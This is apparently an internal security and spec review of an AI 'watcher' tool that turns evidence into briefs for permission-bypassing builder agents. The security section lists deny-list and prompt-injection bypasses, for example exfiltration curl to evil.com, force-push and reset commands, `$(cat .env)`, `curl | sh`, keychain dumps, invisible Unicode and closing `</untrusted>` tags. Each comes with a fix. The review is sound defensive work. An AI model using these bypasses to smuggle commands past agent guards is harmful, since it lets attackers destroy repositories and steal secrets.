# Run 15 review findings (2026-10-07 ~13:45) — input for the fix brief. Worktree ~/Projects/true.builders/true-watcher-run15-20261007-130237
Paths under Sources/True/Duty/ unless noted. Security verdict: BLOCK merge gate until S1-S4 fixed.

## Security (true-security, sonnet; CONFIRMED unless marked)
S1 P1 WatcherStore.swift:226-233 approve (+ :200 investigate): deny-list never sees evidence[].quote/path/what/cause/title, but approve
   writes evidence quotes into the builder brief -> planted "git push --force" reaches a bypassPermissions builder. Approve also skips
   fix.files. FIX: DenyList.hits on the EXACT brief string written to disk (+files+evidence); refuse on any hit.
S2 P1 DenyList.swift:36 localHost = substring match: `curl -X POST https://evil.com/?r=localhost`, `http://localhost.evil.com` pass.
   FIX: parse URL host, exact match.
S3 P1 DenyList.swift:32,:10-13 no shell normalisation: backslash-newline splits `curl \⏎ -X POST`; `git -C repo push`, `git -c k=v push`,
   `git -C x reset --hard` pass; `git clean -d -f`, `git clean --force` pass; `kill 1234`, `kill -9 $(pgrep True)` pass.
   FIX: join "\\\n" first; `git\s+(\S+\s+)*push`; add `kill\b`; `clean\b.*(-\w*f|--force)`.
S4 P1 DenyList.swift:31,:14 case-sensitive: `drop table`, `truncate table`, `delete from` lowercase pass. FIX: .caseInsensitive all rules.
S5 P1 WatcherStore.swift:108 + Inbox.swift:97 merged duplicate evidence only redacted, not screened -> injection skips the screen and
   item stays canInvestigate. FIX: InjectionScreen.screen merged evidence; clear canInvestigate if flagged.
S6 P1 Investigation.swift:104-106 evidence in <untrusted> not escaped; `</untrusted>` closes the block. FIX: neutralise < > in evidence.
S7 P2 InjectionScreen.swift:14-18 invisible set misses Unicode tags U+E0000-E007F, variation selectors FE00-FE0F/E0100+, U+180E, U+034F,
   Hangul fillers, soft hyphen in commands; no confusable fold; report text never stripped (WatcherStore:199 only redacts) ->
   `git pu­sh` evades deny-list. FIX: strip + NFKC the report before deny-list and brief; extend set.
S8 P2 regex gaps: curl `--json`, `--request=POST`, `-dfoo`, `-sd x`, `-sXPOST`; secret files `.env)` `.env|` `.env>` `.PEM` `$(cat .env)`;
   `pnpm publish` (\bnpm); `security find-internet-password|dump-keychain`; settings.json after `cd ~/.claude`; `curl … | sh`;
   `mail user@x`; `gh release|repo delete|issue comment|api -X`. FIX: widen + tests.
S9 P2 PLAUSIBLE PermissionGate.swift:38 Jev nil -> askFirst (spec) but regex is then the only guard. Consider holding approval of
   items decided while Jev was down.
S10 P2 dormant: WatcherStore.swift:207 preapproval matches kind+repo only, not exact fix; no path executes actIfPreapproved.
S11 P2 PLAUSIBLE Investigation.swift:38-43 `--restricted`, `--permission-prompts none` unverified flags; settings deny lacks
   Read(**/credentials*), Read(~/.aws/**); mcp__jev__ask_file(s) can read any path (bypasses Read denies). FIX: verify flags vs
   `~/.local/bin/claude --help`; restrict MCP root.
S12 P3 Redact misses bare 32-hex/base64 and truncated -----BEGIN.
Test gaps: none for git -C, lowercase SQL, curl -d x, localhost bypass, backslash-newline, tag chars, </untrusted>, merged evidence,
evidence quote reaching approve brief. ADD THEM.

## Spec conformance (sonnet) — SPEC.md 481-650
D1 MISSING Hub Watcher card (On duty/Paused, today spend vs daily limit, Memory, peak context); WatcherViews.swift:9 only shows when
   needsYou non-empty; no "All" inbox, no count by needs-you badge.
D2 MISSING digest display: digestIfDue (WatcherStore.swift:362) -> channel.deliver; HubChannel.lastDigest read nowhere; lacks fixed +
   cost; skipped when nothing open; no pinned-until-opened; no launch/wake trigger.
D3 DIFFERENT git cadence (WatcherStore.swift:306-316): hourly sweep vs spec per-repo <=10 min on pane Stop / builder finish / digest.
D4 MISSING Active repos 14-day rule over BuilderSpawn.allowedRoots.
D5 DIFFERENT done check (WatcherStore.swift:350): later same-name done builder should resolve in CODE (not Jev); checkDone skips .approved.
D6 MISSING burn: hook silently dropped if file missing (surface it); ledger has no tokens/peak context (parse computes contextTokens).
D7 MISSING facts/gitFacts passed empty (WatcherStore.swift:196-198); spec: code gathers git facts.
D8 MISSING fixUSD ledger entry on approve.
D9 DIFFERENT decisions.jsonl: only approve, no Jev answers; reject not logged as decision.
D10 DIFFERENT Jev-nil .evidenceOnly still canInvestigate (WatcherStore.swift:140); spec: Jev down = no investigation.
D11 = S1 (approve re-check not on exact staged brief, omits files).
D12 minor: memory.md heading "## Lessons" vs spec "Yahia told me"; reject menu labels; HubStore builder-change + wake not wired as triggers.
Verified OK: all Jev question texts verbatim, floors, budgets ($0.40/$2/8 runs/300 Jev/fixUSD $1/60k/90k/30 turns), argv, 0600/0700,
inbox fold, stuck rule, pending replay, truectl inbox, Settings toggle.
